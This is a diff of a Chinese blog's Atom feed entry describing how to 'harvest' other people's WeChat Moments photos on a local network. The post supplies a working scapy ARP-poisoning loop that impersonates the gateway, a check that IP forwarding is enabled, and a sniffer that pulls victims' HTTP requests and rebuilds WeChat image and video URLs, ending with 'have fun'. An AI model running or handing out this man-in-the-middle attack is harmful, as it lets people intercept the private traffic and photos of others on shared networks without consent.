@@ -4,7 +4,7 @@
   <subtitle><![CDATA[开放、分享、自由与进步]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://reverland.org/"/>
-  <updated>2016-03-08T14:32:27.729Z</updated>
+  <updated>2016-03-09T02:24:26.797Z</updated>
   <id>http://reverland.org/</id>
   
   <author>
@@ -15,11 +15,11 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title><![CDATA[收割朋友圈红包照片]]></title>
+    <title><![CDATA[收割朋友圈照片]]></title>
     <link href="http://reverland.org/security/2016/03/08/harvest-mm-pics/"/>
     <id>http://reverland.org/security/2016/03/08/harvest-mm-pics/</id>
     <published>2016-03-08T14:17:10.000Z</published>
-    <updated>2016-03-08T14:32:27.729Z</updated>
+    <updated>2016-03-09T02:24:26.797Z</updated>
     <content type="html"><![CDATA[<p>大概源于前一阵很火的微信朋友圈红包照片。</p>
 <p>我记得那天是刚从长亭科技膜拜完离开，看到朋友圈满目的红包照片。</p>
 <p>首先是BJ Nodejs的群里有人开始晒不给红包看照片，后来这些搞计算机的同学都不给红包了。。。</p>
@@ -27,6 +27,8 @@
 <p>于是有下文。</p>
 <h2 id="概述">概述</h2><p>目标：收割手机微信查看朋友圈时的照片</p>
 <p>手段：ARP污染，告诉局域网内所有机器我是网关</p>
+<h2 id="设置系统转发">设置系统转发</h2><p>确保：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reverland@localhost » cat /proc/sys/net/ipv4/ip_forward                                                                                               ~/tmp/sshjs  </span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <h2 id="ARP污染">ARP污染</h2><p>首先，我熟悉的scapy</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 欺骗target我是网关</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line">gateway = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 也许不必要</span></span><br><span class="line"><span class="comment"># 我只需要欺骗victim我是网关，把 请求 数据给我</span></span><br><span class="line"><span class="comment"># 获取网关</span></span><br><span class="line"><span class="comment"># route -n 0.0.0.0</span></span><br><span class="line"><span class="comment">### 本机ip</span></span><br><span class="line"><span class="comment"># ip addr show wlan0</span></span><br><span class="line"><span class="comment"># myip = '192.168.1.2'</span></span><br><span class="line"><span class="comment"># 获取目标MAC地址</span></span><br><span class="line"><span class="comment"># 1. arp -e 192.168.1.6</span></span><br><span class="line"><span class="comment"># 2. this way</span></span><br><span class="line"><span class="comment"># a, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", psrc=myip, pdst=target),inter=RandNum(10,40), loop=0)</span></span><br><span class="line"><span class="comment"># targetMac = a[0][1]['ARP'].hwsrc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    send(ARP(op=<span class="string">"who-has"</span>, pdst=target, psrc=gateway))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>实际上这么一广播所有的机器都会把你当作网关。。。只要你时刻不停的污染下去。</p>
@@ -35,6 +37,11 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prn</span><span class="params">(x)</span>:</span></span><br><span class="line">    s = x[<span class="string">'Raw'</span>].load.split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s.find(<span class="string">'/mmsns/'</span>) &gt;= <span class="number">0</span> <span class="keyword">and</span> s.find(<span class="string">'/0?tp=webp'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'http://mmsns.qpic.cn'</span> + s.replace(<span class="string">'tp=webp'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">elif</span> s.find(<span class="string">'snsvideodownload'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'http://vweixinf.tc.qq.com'</span> + s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfilter</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x.haslayer(<span class="string">'Raw'</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    s = x[<span class="string">'Raw'</span>].load.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">sniff(iface=<span class="string">"wlan0"</span>, filter=<span class="string">"outbound and tcp and (port 80)"</span>, prn=prn, store=<span class="number">0</span>, lfilter=lfilter)</span><br></pre></td></tr></table></figure>
 <p>That is all, have fun!</p>
 <p>scapy 简直杀人越货的必备。发现该项目已经从bitbucket迁移到github上了。</p>
+<p>没有做的</p>
+<ol>
+<li>把两个部分放到两个线程里</li>
+<li></li>
+</ol>
 ]]></content>
     <summary type="html">
     <![CDATA[<p>大概源于前一阵很火的微信朋友圈红包照片。</p>
